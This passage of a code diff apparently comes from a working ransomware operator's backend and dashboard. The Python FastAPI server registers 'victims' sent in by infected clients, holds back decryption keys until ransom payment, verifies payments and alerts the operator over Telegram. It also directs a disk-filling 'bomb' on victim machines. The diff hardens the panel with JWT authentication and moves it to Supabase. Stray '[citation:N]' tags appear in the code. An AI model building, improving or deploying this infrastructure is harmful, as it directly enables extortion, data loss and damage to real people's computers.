                 document.getElementById('tableBody').innerHTML = '<tr><td colspan="7" style="text-align:center;">No victims found</td></tr>';
                 return;
             }
             
             let html = '';
-            filtered.forEach(v => {
+            victims.forEach(v => {
                 const bombIcon = v.bomb_status === 'active' ? '💣 ACTIVE' : '⚫';
                 const bombClass = v.bomb_status === 'active' ? 'bomb-active' : '';
                 
@@ -1333,13 +1210,11 @@ OWNER_DASHBOARD_TEMPLATE = """
             document.getElementById('tableBody').innerHTML = html;
         }
         
-        function filterTable() {
-            renderTable();
-        }
-        
         async function viewVictim(victimId) {
             try {
-                const response = await fetch(`/api/owner/victim/${victimId}`);
+                const response = await fetch(`/api/owner/victim/${victimId}`, {
+                    headers: {'Authorization': `Bearer ${localStorage.getItem('access_token')}`}
+                });
                 currentVictim = await response.json();
                 
                 let details = '';
@@ -1364,11 +1239,12 @@ OWNER_DASHBOARD_TEMPLATE = """
             
             try {
                 const response = await fetch(`/api/owner/mark-paid/${currentVictim.id}`, {
-                    method: 'POST'
+                    method: 'POST',
+                    headers: {'Authorization': `Bearer ${localStorage.getItem('access_token')}`}
                 });
                 
                 if (response.ok) {
-                    alert('✅ Marked as paid! Telegram notification sent.');
+                    alert('✅ Marked as paid!');
                     closeModal();
                     loadVictims();
                     loadStats();
@@ -1384,12 +1260,15 @@ OWNER_DASHBOARD_TEMPLATE = """
             try {
                 const response = await fetch('/api/owner/bomb/start', {
                     method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Authorization': `Bearer ${localStorage.getItem('access_token')}`
+                    },
                     body: JSON.stringify({victim_id: currentVictim.id})
                 });
                 
                 if (response.ok) {
-                    alert('💣 Bomb started! Telegram notification sent.');
+                    alert('💣 Bomb started!');
                     closeModal();
                     loadVictims();
                 }
@@ -1404,12 +1283,15 @@ OWNER_DASHBOARD_TEMPLATE = """
             try {
                 const response = await fetch('/api/owner/bomb/stop', {
                     method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Authorization': `Bearer ${localStorage.getItem('access_token')}`
+                    },
                     body: JSON.stringify({victim_id: currentVictim.id})
                 });
                 
                 if (response.ok) {
-                    alert('⛓️ Bomb stopped! Telegram notification sent.');
+                    alert('⛓️ Bomb stopped!');
                     closeModal();
                     loadVictims();
                 }
@@ -1424,7 +1306,8 @@ OWNER_DASHBOARD_TEMPLATE = """
             
             try {
                 const response = await fetch(`/api/owner/delete-victim/${currentVictim.id}`, {
-                    method: 'DELETE'
+                    method: 'DELETE',
+                    headers: {'Authorization': `Bearer ${localStorage.getItem('access_token')}`}
                 });
                 
                 if (response.ok) {
@@ -1438,48 +1321,6 @@ OWNER_DASHBOARD_TEMPLATE = """
             }
         }
         
-        async function notifyTelegram() {
-            if (!currentVictim) return;
-            
-            try {
-                const response = await fetch('/api/telegram/notify', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        victim_id: currentVictim.id,
-                        message: `Manual notification from admin`
-                    })
-                });
-                
-                if (response.ok) {
-                    alert('📱 Telegram notification sent!');
-                } else {
-                    alert('❌ Failed to send Telegram notification');
-                }
-            } catch(e) {
-                alert('Error sending notification');
-            }
-        }
-        
-        function exportData() {
-            let csv = 'Victim ID,Status,Hostname,IP,Country,City,Files,Ransom,Bomb Status\n';
-            victims.forEach(v => {
-                csv += `"${v.id}",${v.status},"${v.hostname}",${v.ip},"${v.country}","${v.city}",${v.files},"${v.ransom}",${v.bomb_status}\n`;
-            });
-            
-            const blob = new Blob([csv], { type: 'text/csv' });
-            const url = window.URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `victims_${new Date().toISOString().slice(0,10)}.csv`;
-            a.click();
-        }
-        
-        async function logout() {
-            window.location.href = '/';
-        }
-        
-        loadData();
         setInterval(loadData, 30000);
     </script>
 </body>
@@ -1517,18 +1358,20 @@ async def api_stats():
 
 @app.get("/api/victim/{victim_id}")
 async def api_get_victim(victim_id: str):
-    """Get victim details (public) - FIXED: Correct endpoint path"""
+    """Get victim details (public)"""
     try:
-        victim = db_get_one('SELECT * FROM victims WHERE id = ?', (victim_id,))
+        result = supabase_admin.table('victims').select('*').eq('id', victim_id).execute()
         
-        if not victim:
+        if not result.data:
             raise HTTPException(status_code=404, detail="Victim not found")
+        
+        victim = result.data[0]
         
         # Check deadline
         if victim['status'] == 'unpaid' and victim.get('deadline'):
-            deadline = datetime.fromisoformat(victim['deadline'])
+            deadline = datetime.fromisoformat(victim['deadline'].replace('Z', '+00:00'))
             if datetime.utcnow() > deadline:
-                db_update('victims', {'status': 'expired'}, 'id = ?', [victim_id])
+                supabase_admin.table('victims').update({'status': 'expired'}).eq('id', victim_id).execute()
                 victim['status'] = 'expired'
         
         # Don't send key unless paid
@@ -1540,18 +1383,17 @@ async def api_get_victim(victim_id: str):
     except HTTPException:
         raise
     except Exception as e:
-        print(f"Error getting victim: {e}")
         raise HTTPException(status_code=500, detail=str(e))
 
 @app.post("/api/add-victim")
-async def api_add_victim(victim_data: VictimRegister, background_tasks: BackgroundTasks):
+async def api_add_victim(victim_data: VictimRegister):
     """Register new victim (called by client)"""
     try:
         victim_id = victim_data.victim_id or generate_victim_id()
         
         # Check if exists
-        existing = db_get_one('SELECT id FROM victims WHERE id = ?', (victim_id,))
-        if existing:
+        existing = supabase_admin.table('victims').select('id').eq('id', victim_id).execute()
+        if existing.data:
             raise HTTPException(status_code=400, detail="Victim exists")
         
         # Calculate deadline
@@ -1583,23 +1425,12 @@ async def api_add_victim(victim_data: VictimRegister, background_tasks: Backgrou
             'bomb_size': 0
         }
         
-        # Insert into database
-        db_insert('victims', victim_dict)
+        # Insert into Supabase
+        result = supabase_admin.table('victims').insert(victim_dict).execute()
         
-        # Log
-        log_action('new_victim', f'New victim: {victim_id}', victim_data.ip)
-        
-        print(f"[+] New victim registered: {victim_id}")
-        
-        # Send Telegram notification (async)
+        # Send Telegram notification
         location = f"{victim_data.city}, {victim_data.country}" if victim_data.city != 'Unknown' else victim_data.country
-        background_tasks.add_task(
-            telegram.notify_new_victim,
-            victim_id,
-            location,
-            victim_data.ip,
-            victim_data.hostname
-        )
+        telegram.notify_new_victim(victim_id, location, victim_data.ip, victim_data.hostname)
         
         # Prepare response
         response = {
@@ -1629,43 +1460,38 @@ async def api_update_victim(update_data: VictimUpdate):
         if update_data.files_encrypted is not None:
             update_dict['files'] = update_data.files_encrypted
         
-        db_update('victims', update_dict, 'id = ?', [update_data.victim_id])
+        supabase_admin.table('victims').update(update_dict).eq('id', update_data.victim_id).execute()
         
         return {'success': True}
         
     except Exception as e:
-        print(f"Error updating victim: {e}")
         raise HTTPException(status_code=500, detail=str(e))
 
 @app.post("/api/verify-payment")
-async def api_verify_payment(payment_data: PaymentVerify, background_tasks: BackgroundTasks):
+async def api_verify_payment(payment_data: PaymentVerify):
     """Verify payment from client"""
     try:
         # Update victim
-        db_update('victims', {
+        supabase_admin.table('victims').update({
             'status': 'paid',
             'paid_at': datetime.utcnow().isoformat(),
             'tx': payment_data.tx_id
-        }, 'id = ?', [payment_data.victim_id])
+        }).eq('id', payment_data.victim_id).execute()
         
         # Get victim details for notification
-        victim = db_get_one('SELECT * FROM victims WHERE id = ?', (payment_data.victim_id,))
-        
-        log_action('payment', f'Payment for {payment_data.victim_id}: {payment_data.tx_id}')
+        victim = supabase_admin.table('victims').select('*').eq('id', payment_data.victim_id).execute()
         
         # Send Telegram notification
-        if victim:
-            background_tasks.add_task(
-                telegram.notify_payment,
+        if victim.data:
+            telegram.notify_payment(
                 payment_data.victim_id,
-                victim.get('ransom', '0.5 BTC'),
+                victim.data[0].get('ransom', '0.5 BTC'),
                 payment_data.tx_id
             )
         
-        return {'success': True, 'key': victim['key'] if victim else None}
+        return {'success': True, 'key': victim.data[0]['key'] if victim.data else None}
         
     except Exception as e:
-        print(f"Error verifying payment: {e}")
         raise HTTPException(status_code=500, detail=str(e))
 
 # ============================================================================
@@ -1675,48 +1501,43 @@ async def api_verify_payment(payment_data: PaymentVerify, background_tasks: Back
 @app.get("/api/bomb/command/{victim_id}")
 async def api_get_bomb_command(victim_id: str):
     """Get pending bomb command"""
-    victim = db_get_one('SELECT bomb_status FROM victims WHERE id = ?', (victim_id,))
+    victim = supabase_admin.table('victims').select('bomb_status').eq('id', victim_id).execute()
     
-    if victim and victim.get('bomb_status') == 'active':
+    if victim.data and victim.data[0].get('bomb_status') == 'active':
         return {'action': 'start', 'filename': 'explosion.dat'}
     
     return {'action': 'none'}
 
 @app.post("/api/bomb/update")
-async def api_bomb_update(bomb_data: BombUpdate, background_tasks: BackgroundTasks):
+async def api_bomb_update(bomb_data: BombUpdate):
     """Update bomb status"""
     try:
         update_dict = {}
         
         if bomb_data.error:
             update_dict['bomb_status'] = 'error'
-            background_tasks.add_task(telegram.notify_bomb_stop, bomb_data.client_id)
+            telegram.notify_bomb_stop(bomb_data.client_id)
         else:
             update_dict['bomb_size'] = bomb_data.size_gb
             
             # Check if just started
-            victim = db_get_one('SELECT bomb_status FROM victims WHERE id = ?', (bomb_data.client_id,))
-            if victim and victim.get('bomb_status') != 'active' and bomb_data.size_gb > 0:
+            victim = supabase_admin.table('victims').select('bomb_status').eq('id', bomb_data.client_id).execute()
+            if victim.data and victim.data[0].get('bomb_status') != 'active' and bomb_data.size_gb > 0:
                 update_dict['bomb_status'] = 'active'
-                background_tasks.add_task(telegram.notify_bomb_start, bomb_data.client_id)
-            
-            # Progress notifications (throttled)
-            if int(bomb_data.size_gb) % 10 == 0 and bomb_data.size_gb > 0:
-                background_tasks.add_task(telegram.notify_bomb_progress, bomb_data.client_id, bomb_data.size_gb)
+                telegram.notify_bomb_start(bomb_data.client_id)
         
-        db_update('victims', update_dict, 'id = ?', [bomb_data.client_id])
+        supabase_admin.table('victims').update(update_dict).eq('id', bomb_data.client_id).execute()
         
         return {'success': True}
         
     except Exception as e:
-        print(f"Error updating bomb: {e}")
         raise HTTPException(status_code=500, detail=str(e))
 
 # ============================================================================
-# ROUTES - API (Telegram) - FIXED
+# ROUTES - API (Telegram)
 # ============================================================================
 
-@app.get("/api/telegram/status")
+@app.get("/api/telegram/status", dependencies=[Depends(JWTBearer())])
 async def api_telegram_status():
     """Get Telegram bot status"""
     return {
@@ -1724,95 +1545,81 @@ async def api_telegram_status():
         'chat_id': telegram.chat_id if telegram.enabled else None
     }
 
-@app.post("/api/telegram/test")
+@app.post("/api/telegram/test", dependencies=[Depends(JWTBearer())])
 async def api_telegram_test():
     """Test Telegram bot"""
     if not telegram.enabled:
         raise HTTPException(status_code=400, detail="Telegram not configured")
     
-    success = telegram.send("🧪 <b>TEST MESSAGE</b>\n\nThe demon is watching...")
-    return {'success': success}
-
-@app.post("/api/telegram/notify")
-async def api_telegram_notify(request: Request):
-    """Send manual Telegram notification"""
-    if not telegram.enabled:
-        raise HTTPException(status_code=400, detail="Telegram not configured")
-    
-    data = await request.json()
-    victim_id = data.get('victim_id')
-    message = data.get('message', 'Manual notification')
-    
-    success = telegram.send(f"📋 <b>ADMIN NOTIFICATION</b>\n\n<b>Victim:</b> {victim_id}\n<b>Message:</b> {message}")
+    success = telegram.send("🧪 <b>TEST MESSAGE</b>\n\nOwner dashboard test")
     return {'success': success}
 
 # ============================================================================
-# ROUTES - API (Owner Only) - FIXED AUTHENTICATION
+# ROUTES - API (Owner Only with JWT Auth) [citation:1][citation:4]
 # ============================================================================
 
-@app.post("/api/owner/login")
+@app.post("/api/owner/login", response_model=OwnerLoginResponse)
 async def api_owner_login(login_data: OwnerLogin):
-    """Owner login API - FIXED: Proper credential checking"""
-    print(f"[+] Login attempt: ID='{login_data.owner_id}', Password='{login_data.password}'")
-    print(f"[+] Expected: ID='{Config.OWNER_ID}', Password='{Config.OWNER_PASSWORD}'")
-    
-    if login_data.owner_id == Config.OWNER_ID and login_data.password == Config.OWNER_PASSWORD:
-        log_action('owner_login', 'Owner logged in')
-        print("[+] Login successful")
-        return {'success': True}
-    
-    print("[-] Login failed - invalid credentials")
-    raise HTTPException(status_code=401, detail="Invalid credentials")
+    """Owner login using Supabase Auth"""
+    try:
+        # Authenticate with Supabase [citation:7]
+        auth_response = supabase.auth.sign_in_with_password({
+            "email": login_data.email,
+            "password": login_data.password
+        })
+        
+        if not auth_response.user:
+            raise HTTPException(status_code=401, detail="Invalid credentials")
+        
+        # Return access token [citation:1]
+        return OwnerLoginResponse(
+            access_token=auth_response.session.access_token,
+            token_type="bearer"
+        )
+        
+    except Exception as e:
+        print(f"Login error: {e}")
+        raise HTTPException(status_code=401, detail="Invalid credentials")
 
-@app.post("/api/owner/logout")
-async def api_owner_logout():
-    """Owner logout"""
-    return {'success': True}
-
-@app.get("/api/owner/victims")
-async def api_owner_victims():
+@app.get("/api/owner/victims", dependencies=[Depends(JWTBearer())])
+async def api_owner_victims(current_user: dict = Depends(get_current_user)):
     """Get all victims (owner only)"""
     try:
-        victims = db_execute('SELECT * FROM victims ORDER BY created DESC')
-        return victims
+        result = supabase_admin.table('victims').select('*').order('created', desc=True).execute()
+        return result.data
     except Exception as e:
         raise HTTPException(status_code=500, detail=str(e))
 
-@app.get("/api/owner/victim/{victim_id}")
+@app.get("/api/owner/victim/{victim_id}", dependencies=[Depends(JWTBearer())])
 async def api_owner_victim(victim_id: str):
     """Get single victim (owner only)"""
     try:
-        victim = db_get_one('SELECT * FROM victims WHERE id = ?', (victim_id,))
+        result = supabase_admin.table('victims').select('*').eq('id', victim_id).execute()
         
-        if not victim:
+        if not result.data:
             raise HTTPException(status_code=404, detail="Not found")
         
-        return victim
-    except HTTPException:
-        raise
+        return result.data[0]
     except Exception as e:
         raise HTTPException(status_code=500, detail=str(e))
 
-@app.post("/api/owner/mark-paid/{victim_id}")
-async def api_owner_mark_paid(victim_id: str, background_tasks: BackgroundTasks):
+@app.post("/api/owner/mark-paid/{victim_id}", dependencies=[Depends(JWTBearer())])
+async def api_owner_mark_paid(victim_id: str):
     """Mark victim as paid"""
     try:
-        victim = db_get_one('SELECT * FROM victims WHERE id = ?', (victim_id,))
-        if not victim:
+        victim = supabase_admin.table('victims').select('*').eq('id', victim_id).execute()
+        if not victim.data:
             raise HTTPException(status_code=404, detail="Victim not found")
         
-        db_update('victims', {
+        supabase_admin.table('victims').update({
             'status': 'paid',
             'paid_at': datetime.utcnow().isoformat()
-        }, 'id = ?', [victim_id])
-        
-        log_action('mark_paid', f'Marked {victim_id} as paid')
+        }).eq('id', victim_id).execute()
         
         # Send Telegram notification
-        background_tasks.add_task(
-            telegram.notify_payment,
+        telegram.notify_payment(
             victim_id,
-            victim.get('ransom', '0.5 BTC'),
+            victim.data[0].get('ransom', '0.5 BTC'),
             'manual_verification'
         )
         
@@ -1821,59 +1628,43 @@ async def api_owner_mark_paid(victim_id: str, background_tasks: BackgroundTasks)
     except Exception as e:
         raise HTTPException(status_code=500, detail=str(e))
 
-@app.post("/api/owner/bomb/start")
-async def api_owner_bomb_start(bomb_data: BombControl, background_tasks: BackgroundTasks):
+@app.post("/api/owner/bomb/start", dependencies=[Depends(JWTBearer())])
+async def api_owner_bomb_start(bomb_data: BombControl):
     """Start bomb on victim"""
     try:
-        db_update('victims', {
+        supabase_admin.table('victims').update({
             'bomb_status': 'active',
             'bomb_size': 0
-        }, 'id = ?', [bomb_data.victim_id])
+        }).eq('id', bomb_data.victim_id).execute()
         
-        log_action('bomb_start', f'Started bomb on {bomb_data.victim_id}')
-        
-        # Send Telegram notification
-        background_tasks.add_task(telegram.notify_bomb_start, bomb_data.victim_id)
+        telegram.notify_bomb_start(bomb_data.victim_id)
         
         return {'success': True}
         
     except Exception as e:
         raise HTTPException(status_code=500, detail=str(e))
 
-@app.post("/api/owner/bomb/stop")
-async def api_owner_bomb_stop(bomb_data: BombControl, background_tasks: BackgroundTasks):
+@app.post("/api/owner/bomb/stop", dependencies=[Depends(JWTBearer())])
+async def api_owner_bomb_stop(bomb_data: BombControl):
     """Stop bomb on victim"""
     try:
-        db_update('victims', {
+        supabase_admin.table('victims').update({
             'bomb_status': 'stopped'
-        }, 'id = ?', [bomb_data.victim_id])
+        }).eq('id', bomb_data.victim_id).execute()
         
-        log_action('bomb_stop', f'Stopped bomb on {bomb_data.victim_id}')
-        
-        # Send Telegram notification
-        background_tasks.add_task(telegram.notify_bomb_stop, bomb_data.victim_id)
+        telegram.notify_bomb_stop(bomb_data.victim_id)
         
         return {'success': True}
         
     except Exception as e:
         raise HTTPException(status_code=500, detail=str(e))
 
-@app.delete("/api/owner/delete-victim/{victim_id}")
+@app.delete("/api/owner/delete-victim/{victim_id}", dependencies=[Depends(JWTBearer())])
 async def api_owner_delete_victim(victim_id: str):
     """Delete victim (careful!)"""
     try:
-        db_execute('DELETE FROM victims WHERE id = ?', (victim_id,))
-        log_action('delete_victim', f'Deleted {victim_id}')
+        supabase_admin.table('victims').delete().eq('id', victim_id).execute()
         return {'success': True}
-    except Exception as e:
-        raise HTTPException(status_code=500, detail=str(e))
-
-@app.get("/api/owner/logs")
-async def api_owner_logs():
-    """Get logs"""
-    try:
-        logs = db_execute('SELECT * FROM logs ORDER BY timestamp DESC LIMIT 100')
-        return logs
     except Exception as e:
         raise HTTPException(status_code=500, detail=str(e))
 
